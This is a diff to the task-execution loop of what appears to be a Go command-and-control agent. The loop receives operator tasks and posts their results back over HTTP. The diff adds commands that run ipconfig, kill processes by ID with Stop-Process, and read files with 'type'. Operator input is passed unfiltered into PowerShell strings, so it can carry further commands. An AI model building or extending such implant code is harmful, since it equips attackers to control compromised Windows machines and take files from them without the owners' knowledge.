@@ -33,6 +33,14 @@ func ExecTasks(tasksToDo []string, url string, sleep *int, agentid string, usera
 			data, _ = hg.GetHostname()
 		case "ps":
 			data, _ = hg.PsReturn("tasklist")
+		case "ifconfig":
+			data, _ = hg.PsReturn("ipconfig")
+		case "kill":
+			pid := taskData
+			hg.PsNoOut("Stop-Process -Id " + pid)
+			data = fmt.Sprintf("killed process (%s)", pid)
+		case "cat":
+			data, _ = hg.PsReturn("type " + taskData)
 		}
 
 		rawJsonData := tasks.HttpTaskPostRequest{
